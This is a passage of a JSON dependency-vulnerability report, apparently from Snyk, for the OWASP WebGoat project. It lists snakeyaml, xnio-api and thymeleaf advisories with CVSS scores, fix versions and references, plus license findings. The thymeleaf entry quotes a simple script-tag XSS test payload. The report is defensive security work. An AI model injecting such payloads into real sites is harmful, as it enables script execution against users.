      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": true,
      "publicationTime": "2022-08-29T15:10:51Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174"
        },
        {
          "title": "BitBucket Issues",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/525"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-09-02T01:11:51.425632Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-09-20T15:53:57.072792Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,1.31)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.yaml",
        "artifactId": "snakeyaml"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.yaml:snakeyaml@1.30"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
      "alternativeIds": [],
      "creationTime": "2022-09-05T11:04:53.633779Z",
      "credit": [
        "Dae"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.32 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/5056a448f09c46250346c338e821386caa751182)\n- [Bitbucket Issue and PoC](https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081)\n",
      "disclosureTime": "2022-09-05T10:57:12Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.32"
      ],
      "id": "SNYK-JAVA-ORGYAML-3016888",
      "identifiers": {
        "CWE": [
          "CWE-121"
        ],
        "CVE": [
          "CVE-2022-38752"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-19T08:08:14.388942Z",
      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-09-05T14:36:28Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/5056a448f09c46250346c338e821386caa751182"
        },
        {
          "title": "Bitbucket Issue and PoC",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081"
        },
        {
          "title": "Chromium Bugs",
          "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Stack-based Buffer Overflow",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "severity": "medium",
          "modificationTime": "2022-09-09T01:12:01.539668Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.32)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.yaml",
        "artifactId": "snakeyaml"
      },
      "severityWithCritical": "low",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.yaml:snakeyaml@1.30"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2022-09-05T11:15:20.545842Z",
      "credit": [
        "Dae"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow in `org.yaml.snakeyaml.constructor.BaseConstructor.constructObject` when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174)\n- [Bitbucket Issue](https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027)\n",
      "disclosureTime": "2022-09-05T11:07:09Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "1.31"
      ],
      "id": "SNYK-JAVA-ORGYAML-3016889",
      "identifiers": {
        "CWE": [
          "CWE-121"
        ],
        "CVE": [
          "CVE-2022-38750"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-05T14:37:45.064123Z",
      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-09-05T14:37:45.062245Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174"
        },
        {
          "title": "Bitbucket Issue",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027"
        },
        {
          "title": "Chromium Bugs",
          "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Stack-based Buffer Overflow",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.5,
          "severity": "medium",
          "modificationTime": "2022-09-10T01:11:52.820366Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.31)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.yaml",
        "artifactId": "snakeyaml"
      },
      "severityWithCritical": "low",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.yaml:snakeyaml@1.30"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L/E:P",
      "alternativeIds": [],
      "creationTime": "2022-09-05T11:36:11.867021Z",
      "credit": [
        "Dae"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/f3ab4e0f54c37ddb10f00b71d04187bb0ef1799c)\n- [Bitbucket Issue](https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039)\n",
      "disclosureTime": "2022-09-05T11:27:18Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.31"
      ],
      "id": "SNYK-JAVA-ORGYAML-3016891",
      "identifiers": {
        "CWE": [
          "CWE-121"
        ],
        "CVE": [
          "CVE-2022-38751"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-05T14:35:35.221725Z",
      "moduleName": "org.yaml:snakeyaml",
      "packageManager": "maven",
      "packageName": "org.yaml:snakeyaml",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-09-05T14:35:35.219360Z",
      "references": [
        {
          "title": "Bitbucket Commit",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/f3ab4e0f54c37ddb10f00b71d04187bb0ef1799c"
        },
        {
          "title": "Bitbucket Issue",
          "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039"
        },
        {
          "title": "Chromium Bugs",
          "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Stack-based Buffer Overflow",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "severity": "medium",
          "modificationTime": "2022-09-09T01:12:01.622444Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.31)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.yaml",
        "artifactId": "snakeyaml"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.yaml:snakeyaml@1.30"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.yaml:snakeyaml",
      "version": "1.30"
    },
    {
      "id": "snyk:lic:maven:ch.qos.logback:logback-classic:EPL-1.0_OR_LGPL-2.1",
      "packageName": "ch.qos.logback:logback-classic",
      "semver": {
        "vulnerable": [
          "[0.9.18,)"
        ]
      },
      "creationTime": "2022-09-19T11:50:53.501Z",
      "description": "EPL-1.0 OR LGPL-2.1 license",
      "language": "java",
      "license": "EPL-1.0 OR LGPL-2.1",
      "packageManager": "maven",
      "publicationTime": "2022-09-19T11:50:53.501Z",
      "title": "EPL-1.0 OR LGPL-2.1 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.springframework.boot:spring-boot-starter-logging@2.7.1",
        "ch.qos.logback:logback-classic@1.2.11"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-classic",
      "version": "1.2.11"
    },
    {
      "id": "snyk:lic:maven:ch.qos.logback:logback-core:EPL-1.0_OR_LGPL-2.1",
      "packageName": "ch.qos.logback:logback-core",
      "semver": {
        "vulnerable": [
          "[0.9.18,)"
        ]
      },
      "creationTime": "2022-09-19T10:08:01.613Z",
      "description": "EPL-1.0 OR LGPL-2.1 license",
      "language": "java",
      "license": "EPL-1.0 OR LGPL-2.1",
      "packageManager": "maven",
      "publicationTime": "2022-09-19T10:08:01.613Z",
      "title": "EPL-1.0 OR LGPL-2.1 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-validation@2.7.1",
        "org.springframework.boot:spring-boot-starter@2.7.1",
        "org.springframework.boot:spring-boot-starter-logging@2.7.1",
        "ch.qos.logback:logback-classic@1.2.11",
        "ch.qos.logback:logback-core@1.2.11"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-core",
      "version": "1.2.11"
    },
    {
      "id": "snyk:lic:maven:com.github.jnr:jnr-posix:EPL-1.0_OR_GPL-2.0_OR_LGPL-2.1",
      "packageName": "com.github.jnr:jnr-posix",
      "semver": {
        "vulnerable": [
          "[3.0.45,)"
        ]
      },
      "creationTime": "2022-09-20T03:16:24.351Z",
      "description": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1 license",
      "language": "java",
      "license": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1",
      "packageManager": "maven",
      "publicationTime": "2022-09-20T03:16:24.351Z",
      "title": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.asciidoctor:asciidoctorj@2.5.3",
        "org.jruby:jruby@9.3.6.0",
        "org.jruby:jruby-base@9.3.6.0",
        "com.github.jnr:jnr-posix@3.1.15"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "com.github.jnr:jnr-posix",
      "version": "3.1.15"
    },
    {
      "id": "snyk:lic:maven:org.aspectj:aspectjweaver:EPL-1.0",
      "packageName": "org.aspectj:aspectjweaver",
      "semver": {
        "vulnerable": [
          "[0,)"
        ]
      },
      "creationTime": "2022-09-20T05:17:15.368Z",
      "description": "EPL-1.0 license",
      "language": "java",
      "license": "EPL-1.0",
      "packageManager": "maven",
      "publicationTime": "2022-09-20T05:17:15.368Z",
      "title": "EPL-1.0 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
        "org.springframework.boot:spring-boot-starter-aop@2.7.1",
        "org.aspectj:aspectjweaver@1.9.7"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.aspectj:aspectjweaver",
      "version": "1.9.7"
    },
    {
      "id": "snyk:lic:maven:org.hibernate.common:hibernate-commons-annotations:LGPL-2.1",
      "packageName": "org.hibernate.common:hibernate-commons-annotations",
      "semver": {
        "vulnerable": [
          "[0,)"
        ]
      },
      "creationTime": "2022-09-19T14:31:17.199Z",
      "description": "LGPL-2.1 license",
      "language": "java",
      "license": "LGPL-2.1",
      "packageManager": "maven",
      "publicationTime": "2022-09-19T14:31:17.199Z",
      "title": "LGPL-2.1 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
        "org.hibernate:hibernate-core@5.6.9.Final",
        "org.hibernate.common:hibernate-commons-annotations@5.1.2.Final"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.hibernate.common:hibernate-commons-annotations",
      "version": "5.1.2.Final"
    },
    {
      "id": "snyk:lic:maven:org.hibernate:hibernate-core:LGPL-2.1",
      "packageName": "org.hibernate:hibernate-core",
      "semver": {
        "vulnerable": [
          "[5.3.1.Final,)"
        ]
      },
      "creationTime": "2022-09-20T02:11:51.164Z",
      "description": "LGPL-2.1 license",
      "language": "java",
      "license": "LGPL-2.1",
      "packageManager": "maven",
      "publicationTime": "2022-09-20T02:11:51.164Z",
      "title": "LGPL-2.1 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
        "org.hibernate:hibernate-core@5.6.9.Final"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-core",
      "version": "5.6.9.Final"
    },
    {
      "id": "snyk:lic:maven:org.jruby:dirgra:EPL-1.0",
      "packageName": "org.jruby:dirgra",
      "semver": {
        "vulnerable": [
          "[0,)"
        ]
      },
      "creationTime": "2022-09-20T01:59:45.689Z",
      "description": "EPL-1.0 license",
      "language": "java",
      "license": "EPL-1.0",
      "packageManager": "maven",
      "publicationTime": "2022-09-20T01:59:45.689Z",
      "title": "EPL-1.0 license",
      "type": "license",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.asciidoctor:asciidoctorj@2.5.3",
        "org.jruby:jruby@9.3.6.0",
        "org.jruby:jruby-base@9.3.6.0",
        "org.jruby:dirgra@0.3"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.jruby:dirgra",
      "version": "0.3"
    }
  ],
  "ok": false,
  "dependencyCount": 136,
  "org": "akashnish",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.0\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "AGPL-1.0": {
        "licenseType": "AGPL-1.0",
        "severity": "high",
        "instructions": ""
      },
      "AGPL-3.0": {
        "licenseType": "AGPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "Artistic-1.0": {
        "licenseType": "Artistic-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "Artistic-2.0": {
        "licenseType": "Artistic-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "CDDL-1.0": {
        "licenseType": "CDDL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "CPOL-1.02": {
        "licenseType": "CPOL-1.02",
        "severity": "high",
        "instructions": ""
      },
      "EPL-1.0": {
        "licenseType": "EPL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "GPL-3.0": {
        "licenseType": "GPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "LGPL-2.0": {
        "licenseType": "LGPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-2.1": {
        "licenseType": "LGPL-2.1",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-3.0": {
        "licenseType": "LGPL-3.0",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-1.1": {
        "licenseType": "MPL-1.1",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-2.0": {
        "licenseType": "MPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "MS-RL": {
        "licenseType": "MS-RL",
        "severity": "medium",
        "instructions": ""
      },
      "SimPL-2.0": {
        "licenseType": "SimPL-2.0",
        "severity": "high",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": {
    "adminOnly": false,
    "reasonRequired": false,
    "disregardFilesystemIgnores": false
  },
  "summary": "54 vulnerable dependency paths",
  "remediation": {
    "unresolved": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "alternativeIds": [],
        "creationTime": "2022-08-28T06:46:31.563692Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 5.3,
        "description": "## Overview\n[org.jboss.xnio:xnio-api](https://mvnrepository.com/artifact/org.jboss.xnio/xnio-api) is a simplified low-level I/O layer which can be used anywhere you are using NIO.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the `notifyReadClosed` method by allowing an attacker to send flawed requests to a server, possibly causing log contention-related performance concerns or an unwanted disk fill-up.\n## Remediation\nUpgrade `org.jboss.xnio:xnio-api` to version 3.8.8 or higher.\n## References\n- [GitHub Commit](https://github.com/xnio/xnio/commit/fdefb3b8b715d33387cadc4d48991fb1989b0c12)\n- [GitHub PR](https://github.com/xnio/xnio/pull/291)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2064226)\n",
        "disclosureTime": "2022-08-28T06:35:33Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [
          "3.8.8"
        ],
        "id": "SNYK-JAVA-ORGJBOSSXNIO-2994360",
        "identifiers": {
          "CWE": [
            "CWE-770"
          ],
          "GHSA": [
            "GHSA-76fg-mhrg-fmmg"
          ],
          "CVE": [
            "CVE-2022-0084"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-09-18T13:12:22.790473Z",
        "moduleName": "org.jboss.xnio:xnio-api",
        "packageManager": "maven",
        "packageName": "org.jboss.xnio:xnio-api",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-08-28T09:48:11Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/xnio/xnio/commit/fdefb3b8b715d33387cadc4d48991fb1989b0c12"
          },
          {
            "title": "GitHub PR",
            "url": "https://github.com/xnio/xnio/pull/291"
          },
          {
            "title": "RedHat Bugzilla Bug",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2064226"
          }
        ],
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Allocation of Resources Without Limits or Throttling",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [
          {
            "assigner": "NVD",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "severity": "high",
            "modificationTime": "2022-09-02T01:11:44.401821Z"
          }
        ],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,3.8.8)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.jboss.xnio",
          "artifactId": "xnio-api"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-undertow@2.7.1",
          "io.undertow:undertow-core@2.2.18.Final",
          "org.jboss.xnio:xnio-api@3.8.7.Final"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.jboss.xnio:xnio-api",
        "version": "3.8.7.Final",
        "severityWithCritical": "medium"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
        "alternativeIds": [],
        "creationTime": "2020-06-14T12:54:59.278366Z",
        "credit": [
          "zeko868"
        ],
        "cvssScore": 6.5,
        "description": "## Overview\n[org.thymeleaf.extras:thymeleaf-extras-springsecurity5](https://search.maven.org/artifact/org.thymeleaf.extras/thymeleaf-extras-springsecurity5) is a Modern server-side Java template engine for both web and standalone environments.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) when creating a user with username `<script type=\"text/javascript>alert(\"\");</script> `.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.thymeleaf.extras:thymeleaf-extras-springsecurity5` to version 3.1.0.M1 or higher.\n## References\n- [GitHub Commit](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75/commits/1b001a1d6e717dab6e864ed8338835909536b665)\n- [GitHub Issue](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/issues/69)\n- [GitHub PR](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75)\n",
        "disclosureTime": "2020-06-14T12:40:12Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [
          "3.1.0.M1"
        ],
        "id": "SNYK-JAVA-ORGTHYMELEAFEXTRAS-572299",
        "identifiers": {
          "CWE": [
            "CWE-79"
          ],
          "CVE": []
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-01-20T10:34:35.229325Z",
        "moduleName": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
        "packageManager": "maven",
        "packageName": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-08-12T10:53:16Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75/commits/1b001a1d6e717dab6e864ed8338835909536b665"
          },
          {
            "title": "GitHub Issue",
            "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/issues/69"
          },
          {
            "title": "GitHub PR",
            "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75"
          }
        ],
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Cross-site Scripting (XSS)",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,3.1.0.M1)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.thymeleaf.extras",
          "artifactId": "thymeleaf-extras-springsecurity5"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.thymeleaf.extras:thymeleaf-extras-springsecurity5@3.0.4.RELEASE"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
        "version": "3.0.4.RELEASE",
        "severityWithCritical": "medium"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "alternativeIds": [],
        "creationTime": "2022-05-01T15:16:35.982479Z",
        "credit": [
          "unknown"
        ],
        "cvssScore": 7.5,
        "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to missing nested depth limitation for collections.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` 